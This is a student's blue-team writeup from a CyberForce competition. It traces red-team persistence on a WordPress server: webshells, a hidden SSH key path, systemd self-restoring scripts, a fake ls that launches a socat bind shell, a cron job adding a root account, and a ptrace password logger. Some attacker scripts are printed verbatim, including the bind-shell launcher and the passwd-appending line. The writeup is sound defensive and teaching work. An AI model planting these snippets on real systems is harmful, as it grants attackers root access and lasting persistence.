---
tags: Projects
---

# CyberForce 2026 Writeup: Task

## Overview

This was a part of the CyberForce Competition, a blue team competition run by the U.S. Department of Energy. I defended Task, an openSUSE box running the company WordPress site, MySQL, Samba, and SSH. Before competition day I went through it and found seven things the red team had already planted on it. Some were built to put themselves back when deleted. One of them was started by me, every time I typed `ls`.

I found and quarantined all of it, traced each piece back to whatever was restarting it, and confirmed the scored services stayed up afterward. This post goes through it in the order I found things.

## The competition

The [CyberForce Competition](https://cyberforce.energy.gov/cyberforce-competition/) is led by Argonne National Laboratory for the Department of Energy. Every student team is a blue team. You are handed a small company network built around an energy scenario and you have to defend it while keeping it usable.

There are four groups involved:

- **Blue team:** the students. We secure the network and keep the services running.
- **Red team:** industry volunteers who attack every blue team's network.
- **Green team:** volunteers who act as normal users. They visit the website and check that it works.
- **Orange team:** judges who grade the security documentation each team submits beforehand.

The scenario was a geothermal energy company called Vulcana Dynamics. Each team got six machines. Part of the network was marked "Assume Breach", which means the red team is already inside those machines when you get them. On the rest, called the Traditional zone, the red team attacks from outside on competition day.

Teams get access to their environment ahead of competition day to harden it and write the security documentation. The hunt in this post happened in that window.

## Competition environment

All six machines sat on one flat subnet.

| Box | OS | Zone | What it runs |
|---|---|---|---|
| **Task** | openSUSE Leap | Traditional | Company WordPress site (Apache, MySQL), Samba, SSH |
| Mail/File | Windows Server 2019 | Traditional | File server, mail |
| AD | Windows Server 2022 | Traditional | Active Directory |
| PLC1 | Ubuntu 24 | Traditional | OpenPLC, Modbus TCP 502 |
| HMI | Windows Server 2019 | Assume Breach | Ignition HMI, MySQL historian |
| PLC2 | Debian 13 | Assume Breach | DNP3 20000, MQTT 1883 |

The last three are the industrial control system (ICS) side, the part that stands in for the geothermal plant:

- **PLC1** runs OpenPLC, which turns a normal Linux box into a programmable logic controller. It runs the control logic for the plant's separator and serves the live sensor values over Modbus TCP on port 502.
- **PLC2** is a second controller that speaks DNP3, another industrial protocol.
- **HMI** runs Ignition. It polls PLC1 over Modbus and PLC2 over DNP3 and draws the operator screens: generation, alarms, and charts.

The data path is: scoreboard feed, to PLC1 (OpenPLC), over Modbus 502, to Ignition on the HMI, to the Geothermal Monitoring page.

**Task was my box, and every screenshot in this post was taken on it.** You can see it in the prompt: `ip-10-0-186-145` is Task's hostname. A red prompt means I was root, a white one means I was the `blueteam` user.

Task is the IT side, not the ICS side, but that does not make it less important. It is on the same flat subnet as the PLCs, and Modbus has no authentication. Anyone with a root shell on Task can talk straight to port 502 on PLC1. So a backdoor on the web server is also a way into the plant.

| Item | Detail |
|---|---|
| Host | Task, `ip-10-0-186-145` (AWS VM) |
| OS | openSUSE Leap, systemd, firewalld, SELinux |
| My account | `blueteam`, in the `wheel` group |
| Scored services | HTTP 80 (WordPress), MySQL 3306, SMB 139/445, SSH 22 |
| Web server user | `wwwrun` (Apache's account on openSUSE) |

## Findings

| # | Finding | Location | How it survived |
|---|---|---|---|
| 1 | Web server user can run `tar` as root | `/etc/sudoers.d/10-cache` | Immutable file, rebuilt by #3 |
| 2 | sshd reads keys from a hidden folder holding a red team key | `/etc/ssh/sshd_config.d/99-cache.conf`, `/etc/ssh/.keys/blueteam` | Immutable files, rebuilt by #3 |
| 3 | Timer and looping service that put #1, #2 and one webshell back | `systemd-cache-sync.timer`, `systemd-cache-watch.service`, `/usr/local/sbin/.cache-sync`, `.cache-watch` | systemd, immutable files, `Restart=always` |
| 4 | Three PHP webshells | `wp-content/mu-plugins/`, `wp-content/uploads/` | One rebuilt by #3 |
| 5 | Fake `ls` that starts a bind shell on port 45926 | `/usr/local/var/log/ls`, `/usr/local/bin/ls`, `/etc/profile.d/00-custom.sh` | PATH hijack, runs on every `ls` |
| 6 | Cron job adding a second UID 0 account | `/etc/cron.d/system-health`, `/usr/local/bin/.health-check.sh` | Runs every 5 minutes |
| 7 | Service tracing password prompts | `network-bridge.service`, `/usr/bin/json_pp-3.13` | systemd, `Restart=always` |

## Looking around

My first login. The home directory already had things in it that I did not put there: a `credentials.zip`, a root-owned `test.txt`, and a hidden `.cfc-baseline` folder. I noted them and moved on. Two of the three turn out to matter later.

![ls -la of the blueteam home directory showing credentials.zip, a root-owned test.txt, and a hidden .cfc-baseline folder](/assets/img/cyberforce-2026/01-home-directory.png)

*My home directory on first login. `test.txt` is owned by root and `.cfc-baseline` is hidden.*

## A sudoers rule for the web server

I searched sudoers for passwordless rules.

```plaintext
sudo grep -rn NOPASSWD /etc/sudoers /etc/sudoers.d/
```

![grep for NOPASSWD showing three rules: wheel, ec2-user, and wwwrun running /usr/bin/tar](/assets/img/cyberforce-2026/02-nopasswd-grep.png)

*Three passwordless rules. The third one is the problem.*

`wwwrun` is the account Apache runs as on openSUSE. It has no reason to use sudo at all. Letting it run `tar` as root is a full root shell, because `tar` can be told to run a command at a checkpoint. So anyone who can run code as the web server becomes root.

![Contents of /etc/sudoers.d/10-cache with a comment block claiming it is scoring infrastructure](/assets/img/cyberforce-2026/03-sudoers-10-cache.png)

*The rule is labeled "cache maintenance". Below it is a comment block claiming to be scoring infrastructure.*

Every planted file in this chain had that same comment block. It says the file is required for competition scoring, should not be removed, and should be left out of reports, and it is signed `Marker: CHRONO-7`. It is there to make whoever finds the file leave it alone. My team asked the organizers about it. The answer was that anything we were required to keep was listed in the official documentation, and anything else was ours to judge. These were not in the documentation, so I treated them as hostile.

The file would not delete, even as root. It had the immutable attribute set, so it took `chattr -i` before it would move to `/root/quarantine/`.

## The SSH backdoor

### Keys from a second location

Next I checked what sshd was really running with. Not the config file, the effective config:

```plaintext
sudo sshd -T | grep -Ei 'permitrootlogin|passwordauth|x11forwarding|maxauthtries|authorizedkeysfile'
```

![sshd -T output with authorizedkeysfile listing both .ssh/authorized_keys and /etc/ssh/.keys/%u](/assets/img/cyberforce-2026/04-sshd-effective-config.png)

*The last line should only list `.ssh/authorized_keys`.*

sshd was also accepting keys from `/etc/ssh/.keys/%u`, a hidden folder outside anyone's home directory. Checking `~/.ssh/authorized_keys` would never have shown it.

The setting came from a drop-in file, `/etc/ssh/sshd_config.d/99-cache.conf`, with the same CHRONO-7 comment. That gave me a string to search the whole disk for.

![grep for the comment text listing every planted file on the box](/assets/img/cyberforce-2026/05-marker-grep-finds-siblings.png)

*One grep lists the whole chain: the sudoers file, the sshd drop-in, a WordPress plugin, a hidden script in `/usr/local/sbin`, and a `payloads` folder.*

### The red team's key

The hidden folder had one file, named after my account.

![ls of /etc/ssh/.keys showing a single file named blueteam](/assets/img/cyberforce-2026/06-hidden-keys-dir.png)

![The public key in /etc/ssh/.keys/blueteam with the comment cfc-redteam](/assets/img/cyberforce-2026/07-red-team-public-key.png)

*The key comment is `cfc-redteam`.*

With that key in place the red team could log in as `blueteam` without knowing the password. Changing the password would not have locked them out. And `blueteam` is in the `wheel` group, which had passwordless sudo, so that login is root.

### Port forwarding switched on

Next to `99-cache.conf` was a second drop-in, `10-gatewayports.conf`, turning on `GatewayPorts` and `AllowTcpForwarding`. That lets anyone with an SSH session open tunnels through the box to the rest of the subnet.

![10-gatewayports.conf enabling GatewayPorts and AllowTcpForwarding](/assets/img/cyberforce-2026/08-gatewayports-dropin.png)

Both drop-ins and the key went to quarantine, again after `chattr -i`, and `sshd -T` went back to showing only `.ssh/authorized_keys`.

## The self-healing scripts

### The script that puts everything back

The grep for the comment text also turned up `/usr/local/sbin/.cache-sync`. This is the part that makes it persistence and not just a pile of bad config.

![The .cache-sync script, which rebuilds the plugin, the sudoers rule, and the SSH key if they are missing](/assets/img/cyberforce-2026/09-cache-sync-script.png)

*The top of the image is the sshd drop-in. The script starts at `#!/bin/bash`.*

It checks for three things and rebuilds any that are missing, from a `payloads` folder:

```plaintext
#!/bin/bash
# object cache sync helper
[ -e /etc/.cfc-disable ] && exit 0    # kill-switch
P=/root/.cfc-baseline/payloads
WP=/srv/www/vhosts/wordpress/wp-content
# V1 mu-plugin
if [ ! -f "$WP/mu-plugins/wp-cache-index.php" ]; then
  mkdir -p "$WP/mu-plugins"
  cp "$P/mu.php" "$WP/mu-plugins/wp-cache-index.php"
  chown -R wwwrun:www "$WP/mu-plugins"; chmod 644 "$WP/mu-plugins/wp-cache-index.php"
  touch -r "$WP/../wp-settings.php" "$WP/mu-plugins/wp-cache-index.php" "$WP/mu-plugins"
fi
# V2 sudoers
if [ ! -f /etc/sudoers.d/10-cache ]; then
  cp "$P/10-cache" /etc/sudoers.d/10-cache; chmod 440 /etc/sudoers.d/10-cache
fi
# V3 ssh key redirect
#   ...puts 99-cache.conf and /etc/ssh/.keys/blueteam back, then reloads sshd
exit 0
```

Three things stood out:

- It numbers its own backdoors: V1 is a WordPress plugin, V2 is the sudoers rule, V3 is the SSH key.
- `touch -r` copies the timestamp from a real WordPress file onto the planted one, so sorting by date does not expose it.
- The first line is a kill switch. If `/etc/.cfc-disable` exists, the script does nothing.

At this point I had removed V2 and V3 but had not yet found what was running the script.

### What runs the script

Then `/etc/ssh/.keys` showed up again. It was empty, but I had already moved it out. Something was still running.

```plaintext
grep -rlsE "cache-sync|cfc|\.keys" /etc/systemd /usr/lib/systemd /etc/cron* /var/spool/cron
```

![grep finding systemd-cache-sync.service, and a listing of /etc/systemd/system with three systemd-cache units](/assets/img/cyberforce-2026/10-systemd-units-found.png)

*Three units named to look like systemd's own: `systemd-cache-sync.service`, `systemd-cache-sync.timer`, `systemd-cache-watch.service`.*

![The timer unit running every 10 minutes and the watch service with Restart=always](/assets/img/cyberforce-2026/11-timer-and-watch-units.png)

*The timer runs `.cache-sync` two minutes after boot and every ten minutes after that. The watch service runs a second script and restarts within three seconds if killed.*

The second script, `.cache-watch`, is the same idea without the wait. It loops forever with a two second sleep, and it sets the immutable bit on everything it restores. It also rebuilds its own service file if that goes missing.

![The .cache-watch script: a while true loop that restores each backdoor, sets chattr +i, and sleeps 2 seconds](/assets/img/cyberforce-2026/12-cache-watch-script.png)

*`while true` and `sleep 2`. Note the `chattr +i` after each copy and the last block, which reinstalls the watch service itself.*

So there were two layers guarding the backdoors: a timer every ten minutes and a loop every two seconds, both immutable.

![lsattr showing the immutable flag on all three unit files](/assets/img/cyberforce-2026/13-units-immutable.png)

![systemctl list-timers showing systemd-cache-sync.timer in the schedule](/assets/img/cyberforce-2026/14-timer-firing.png)

*Second row: the timer is live and scheduled to run again.*

That also explained the empty folder. Both scripts copy from `/root/.cfc-baseline/payloads`, and on my box that path did not exist. The payloads were sitting in `/home/blueteam/.cfc-baseline/payloads`. So the `mkdir` worked and the `cp` failed. The self-heal was running the whole time. It just had nothing to copy. If that path had been right, the sudoers rule and the SSH key would have come back two seconds after I removed them.

To shut it down I created the kill switch file, stopped and disabled all three units, cleared the immutable bits, and moved the units and both scripts to `/root/quarantine/persistence/`.

```plaintext
touch /etc/.cfc-disable
systemctl disable --now systemd-cache-watch.service
systemctl disable --now systemd-cache-sync.timer systemd-cache-sync.service
```

### The red team left their notes

The `.cfc-baseline` folder from my first login held the payloads, a manifest, and an uninstall script.

![manifest.txt listing every file the red team added, with a maintenance note about rotating the SSH key](/assets/img/cyberforce-2026/15-red-team-manifest.png)

*A list of every file they added, and a maintenance note about rotating the SSH key.*

![The payloads folder, the plugin source, the key, and revert.sh](/assets/img/cyberforce-2026/16-payloads-and-revert-script.png)

*The payload folder, the plugin source, the key, and `revert.sh`, which removes V0 through V4 in order.*

The manifest was useful as a checklist. It confirmed what I had found and pointed at one thing I had not: a file in the WordPress uploads folder, which the note calls a "loud decoy" that students are meant to find.

## The webshells

### The must-use plugin

This is V1, at `wp-content/mu-plugins/wp-cache-index.php`. Files in `mu-plugins` are "must-use" plugins. WordPress loads them on every request and they do not show up in the normal plugin list.

![wp-cache-index.php, which evals base64 from the POST body when a secret header matches](/assets/img/cyberforce-2026/17-mu-plugin-webshell.png)

*If the request carries the right `X-WP-Cache-Key` header, it runs whatever PHP is in the POST body.*

That is code execution as `wwwrun`. Put it next to the sudoers rule from earlier and it is one request to root.

### Two more in the uploads folder

This is where V0 was. The uploads folder was world-writable and had two PHP files in it. Uploads should never contain PHP.

![ls of wp-content/uploads showing drwxrwxrwx and two PHP helper files](/assets/img/cyberforce-2026/18-uploads-listing.png)

*`drwxrwxrwx` on the folder, and two "helper" scripts.*

![wp-upload-helper.php: a one line system() webshell](/assets/img/cyberforce-2026/19-upload-helper-webshell.png)

*The decoy. One line: run the `c` parameter as a shell command. No password.*

![wp-upgrade-helper.php: passthru() behind a header check, returning 404 otherwise](/assets/img/cyberforce-2026/20-upgrade-helper-webshell.png)

*Runs the `m` parameter if a header hashes to a fixed value, and returns a 404 otherwise so it looks like the file is not there.*

The second one was not in the manifest. As written, the check wants a SHA-256 hash equal to `dede...de`, which nobody can produce on purpose, so it may be a second decoy. I removed it either way.

All three went to quarantine, the uploads folder went back to `755`, and I confirmed the site still answered.

## The bind shell on port 45926

### An odd port

After the webshells I checked listening ports.

![ss -tulpn output with an unexpected listener on port 45926](/assets/img/cyberforce-2026/21-listening-ports.png)

*Port 45926 is not one of my services.*

### A filesystem tool that is not a filesystem tool

I went back to port 45926 to see what was behind it.

```plaintext
ss -tlpn 'sport = :45926'
ps -fp 2378
ls -l /proc/2378/exe
```

![ss, ps, and /proc/2378/exe showing a process named mkfs.azfs whose binary is /usr/bin/socat1](/assets/img/cyberforce-2026/22-mkfs-azfs-is-socat.png)

*The process calls itself `mkfs.azfs`. The binary behind it is `socat`.*

`mkfs.azfs` sounds like a disk formatting tool. There is no such filesystem. `/proc/<pid>/exe` shows what is really running: `socat`, with the arguments `TCP-LISTEN:45926,fork EXEC:/bin/bash`. That is a bind shell. Anyone who connects to port 45926 gets a root bash prompt with no login.

Then I asked systemd where the process came from.

![systemctl status 2378 showing the process inside session-1.scope of user blueteam](/assets/img/cyberforce-2026/23-started-from-my-session.png)

*The bind shell is in `session-1.scope` of user `blueteam`, which was my first login.*

It had been running since my first login. The bind shell was started from my own session.

I killed it. It came straight back with a new PID.

![ps and pstree showing a new mkfs.azfs process with parent PID 1](/assets/img/cyberforce-2026/24-bind-shell-respawns.png)

*A new process, parent PID 1.*

### Chasing the restart, and finding something else

I pulled the journal from around the restart.

![journalctl showing root cron running /usr/local/bin/.health-check.sh](/assets/img/cyberforce-2026/25-journal-cron-run.png)

*A root cron job running a hidden script.*

That looked like the cause. It was not, but it was its own backdoor.

![/etc/cron.d entries: system-health every 5 minutes and cache-maintenance](/assets/img/cyberforce-2026/26-cron-d-entries.png)

*`system-health` runs every five minutes. `cache-maintenance` points at a script that does not exist.*

![.health-check.sh appending a svc-backup UID 0 line to /etc/passwd](/assets/img/cyberforce-2026/27-health-check-script.png)

```plaintext
#!/bin/bash
grep -q '^svc-backup:' /etc/passwd || echo 'svc-backup:$1$xyz$...:0:0:backup service:/root:/bin/bash' >> /etc/passwd
```

It appends an account called `svc-backup` to `/etc/passwd` with UID 0, which makes it root under another name. The password hash is written directly into `/etc/passwd`, so it works with no entry in `/etc/shadow`. Delete the account and it is back within five minutes.

Then I counted.

![grep -c counting 17785 svc-backup lines in /etc/passwd](/assets/img/cyberforce-2026/28-svc-backup-count.png)

17,785 copies of the same line. The script has a check that should stop after one, so I do not know for certain why there were so many. My guess is an earlier version of the script had no check and kept appending.

I moved both cron files and the script to quarantine and saved a copy of the poisoned file to `/root/quarantine/passwd-with-svc-backup` as evidence. With the cron job gone, the entries can be stripped from the live file with one `sed` and they stay gone.

### The real cause: ls

The bind shell was still coming back. It restarted again with the cron job already in quarantine. So I went looking at my own shell.

![/etc/profile.d/00-custom.sh prepending /usr/local/var/log to PATH, and a third mkfs.azfs process](/assets/img/cyberforce-2026/29-path-prepend-and-third-respawn.png)

*`/etc/profile.d/00-custom.sh` puts `/usr/local/var/log` at the front of everyone's PATH. Below it, the third copy of the bind shell.*

A log directory at the front of PATH. Then:

```plaintext
type -a ls ss ps kill sudo su systemctl cat grep
```

![type -a output showing four copies of ls, the first two in /usr/local/var/log and /usr/local/bin](/assets/img/cyberforce-2026/30-type-a-ls.png)

*Four copies of `ls`. The first two are not the real one.*

![Both fake ls scripts: check port 45926, start the bind shell if it is closed, then exec the real ls](/assets/img/cyberforce-2026/31-fake-ls-script.png)

*Both fakes are the same script.*

```plaintext
#!/bin/bash

if ! (echo > /dev/tcp/localhost/45926) 2>/dev/null; then
        mkfs.azfs TCP-LISTEN:45926,fork EXEC:/bin/bash &
fi

exec /usr/bin/ls "$@"
```

Every time anyone runs `ls`, it checks whether port 45926 is open. If it is not, it starts the bind shell in the background. Then it runs the real `ls` so the output looks normal.

That explains everything about the bind shell. It first appeared when I logged in because the first thing I did was type `ls`. It came back right after I killed it because I typed `ls` again. I was the persistence mechanism. And since I was usually root when I did it, the shell was a root shell.

There were two copies so that removing one would not be enough: one in `/usr/local/var/log`, found through the PATH change, and one in `/usr/local/bin`, which is ahead of `/usr/bin` by default.

`mkfs.azfs` itself was a link to the real socat binary, not owned by any package, with a second name hidden somewhere else.

![/usr/bin/mkfs.azfs is a link to socat1 and rpm -qf says no package owns it](/assets/img/cyberforce-2026/32-mkfs-azfs-unowned-symlink.png)

![/usr/etc/security/kworker is a second link to socat1](/assets/img/cyberforce-2026/33-kworker-second-name.png)

*The same link again as `/usr/etc/security/kworker`, named after a kernel thread. Found with `find / -samefile /usr/bin/mkfs.azfs`.*

Everything went to `/root/quarantine/ls-hijack/`: both fake `ls` scripts, `00-custom.sh`, and both links. I left `/usr/bin/socat1` alone because it belongs to the real `socat` package. Then `hash -r` so bash would forget the old path, one last `kill`, and port 45926 stayed closed.

## The password logger

One thing left from my first login: `test.txt`, the root-owned file in my home directory that kept growing.

```plaintext
fuser -v /home/blueteam/test.txt
```

That named two processes called `json_pp-3.13`, both running as root.

![network-bridge.service running /bin/json_pp-3.13 as root with output appended to /home/blueteam/test.txt](/assets/img/cyberforce-2026/34-network-bridge-service.png)

*A service described as "Set up LAN Bridge" that runs `/bin/json_pp-3.13`, appends its output to `/home/blueteam/test.txt`, and restarts if killed.*

`json_pp` is a real tool. It is a small Perl script that formats JSON. This one is a binary that no package owns, running as a root service since boot, under a description that has nothing to do with what it does.

![test.txt contents: ptrace attach to passwd and a log of every read() syscall](/assets/img/cyberforce-2026/35-sniffer-log.png)

*The log file.*

The log shows it attaching to a `passwd` process with `ptrace` and recording every `read()` that process makes. `ptrace` is what debuggers use to watch another program. Pointed at `passwd`, `sudo`, or `sshd`, it can see a password as it is typed. The first traced command in the log is `passwd -l ec2-user`, which is me locking an account earlier in the hunt. I cannot say from the log alone whether it captured a password, so I treated anything typed on this box up to that point as exposed.

I disabled the service, moved the unit, the binary, and the log to `/root/quarantine/pw-sniffer/`, and checked that nothing on the box was still being traced:

```plaintext
systemctl disable --now network-bridge.service
grep -H TracerPid /proc/[0-9]*/status | grep -v 'TracerPid:\s*0$'
```

Password rotation on this box happened after the logger was gone, not before.

## Gathering evidence for the security documentation

Part of the CyberForce score comes from a security document each team turns in ahead of competition day, graded by the Orange team. One section is a table of every vulnerability you found, one row per vulnerability per host, with what you did about it. It is written for senior leadership, so raw scan output does not count. Everything in this post had to end up as a row in that table, which changed how I worked on the box.

**Screenshot the proof before touching anything.** For each finding I took a screenshot with the command and its output both in frame, so the picture shows how I found it and not just that it exists. Every image in this post started as one of those.

**Move it, do not delete it.** Nothing I found was removed with `rm`. It all went to `/root/quarantine/`, with a subfolder per finding: `persistence/` for the units and scripts, `ls-hijack/` for the fake `ls`, and `pw-sniffer/` for the password logger. A copy of the poisoned `/etc/passwd` went there too.

![lsattr of /root/quarantine listing the quarantined sudoers files, sshd drop-ins, the persistence folder, and the saved passwd copy](/assets/img/cyberforce-2026/36-quarantine-folder.png)

*The quarantine folder partway through. Checking it with `lsattr` also confirmed the immutable flags were gone.*

**Make the evidence safe to keep.** Quarantined scripts got `chmod a-x` so nothing in the folder could run by accident, and the folder itself is `700` and owned by root.

**Prove it is not stock.** "This looks suspicious" is not much of a finding. `rpm -qf` showing that no package owns a file is. For config files, openSUSE keeps the vendor default under `/usr/etc`, so a `diff` against it shows exactly what was changed.

![diff of /usr/etc/sudoers against /etc/sudoers showing the wheel NOPASSWD line uncommented](/assets/img/cyberforce-2026/37-sudoers-vendor-diff.png)

*The vendor sudoers file against the live one. The only real change is the `%wheel` passwordless rule being switched on.*

**Prove the fix worked.** After each removal I ran a check that would fail if it had come back: `sshd -T` for the key path, `ss -tlnp` for the port, `systemctl is-active` and `pgrep` for the services, and `curl` against the site to make sure I had not broken a scored service while cleaning up.

**Ask before assuming.** The "do not remove" comments were the one thing I could not settle from the box alone, so my team asked the organizers and I screenshotted the answer.

**Write the row in plain language.** Each finding became one row: the host, what was wrong in a sentence someone outside IT could follow, and what we did. Things I could not fix went in too, marked as open with the reason.

![A row from the vulnerability table: Task, the MySQL scoring accounts with full privileges, listed as an open issue with a planned mitigation](/assets/img/cyberforce-2026/38-secdoc-row.png)

*One row from our table. The scoring accounts are not ours to change, so it is listed as an open issue instead of being left out.*

Before the document went in, I checked each row against the box one more time. One row said a step was done that had not been done yet, and that check is what caught it.

## How the pieces fit

Laid out together, it is a layered design, and each layer covers for the one before it:

1. **Ways in:** a webshell that anyone can hit (V0), a webshell behind a secret header (V1), an SSH key that survives password changes (V3), a bind shell on a high port, and a second root account.
2. **Ways up:** the web server user can become root through `tar` (V2).
3. **Ways to stay:** a timer and a looping service that rebuild V1 through V3, immutable bits on everything, a cron job that rebuilds the account, and a fake `ls` that makes the defender restart the bind shell.
4. **Ways to keep up:** a logger watching password changes, so rotating credentials tells the red team the new ones.
5. **Ways to not get removed:** names that look like system parts (`systemd-cache-sync`, `kworker`, `mkfs.azfs`, `json_pp`), copied timestamps, a 404 on the webshell, and comments telling the reader the files are official.

V0 was meant to be found. The idea is that a team finds the obvious webshell, deletes it, and feels finished.

## Lessons learned

- **Check what is running, not what the config says.** `sshd -T` showed the key redirect. `/proc/<pid>/exe` showed that `mkfs.azfs` was socat. The files alone would not have.
- **If something comes back, stop deleting it and find what restores it.** I removed the sudoers file and the SSH key well before I found the units guarding them. That only worked out because the payload path was wrong.
- **Use `type -a` on the commands you trust.** I typed `ls` hundreds of times before I checked which `ls` I was running.
- **`rpm -qf` and `lsattr` are quick filters.** A binary in `/usr/bin` that no package owns is worth a look. So is any file with the immutable bit set.
- **Quarantine, do not delete.** Moving everything to `/root/quarantine/` kept the evidence for the documentation and gave me a way back if I broke a scored service.
- **Collect evidence as you go.** A screenshot taken at the moment of the finding is worth more than trying to recreate it after the file is gone.
- **A comment is not authority.** Files do not get to vouch for themselves. If the official documentation does not list it, it is not required.

## MITRE ATT&CK mapping

| Finding | Technique |
|---|---|
| Webshells in WordPress | T1505.003 Server Software Component: Web Shell |
| Red team key in hidden `AuthorizedKeysFile` path | T1098.004 Account Manipulation: SSH Authorized Keys |
| `wwwrun` NOPASSWD `tar` | T1548.003 Abuse Elevation Control Mechanism: Sudo and Sudo Caching |
| `systemd-cache-watch.service`, `network-bridge.service` | T1543.002 Create or Modify System Process: Systemd Service |
| `systemd-cache-sync.timer` | T1053.006 Scheduled Task/Job: Systemd Timers |
| `/etc/cron.d/system-health` | T1053.003 Scheduled Task/Job: Cron |
| `svc-backup` UID 0 account | T1136.001 Create Account: Local Account |
| Fake `ls` ahead of the real one | T1574.007 Hijack Execution Flow: Path Interception by PATH Environment Variable |
| `/etc/profile.d/00-custom.sh` | T1546.004 Event Triggered Execution: Unix Shell Configuration Modification |
| `mkfs.azfs`, `kworker`, `json_pp-3.13`, `systemd-cache-*` | T1036 Masquerading |
| `chattr +i` on planted files | T1222.002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification |
| `touch -r` on the plugin | T1070.006 Indicator Removal: Timestomp |
| ptrace logger on `passwd` | T1056 Input Capture |
